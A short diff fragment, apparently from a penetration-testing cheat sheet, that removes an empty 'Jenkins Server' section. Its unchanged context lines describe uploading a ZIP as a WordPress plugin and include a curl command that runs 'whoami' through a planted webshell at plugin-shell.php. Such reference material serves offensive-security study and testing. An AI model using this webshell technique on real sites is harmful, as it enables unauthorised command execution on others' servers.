@@ -38,7 +38,3 @@ Upload the ZIP as a plugin. Then run the webshell:
 > curl http://10.10.10.10/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
 ```
 
-###### Jenkins Server
-```
-
-```
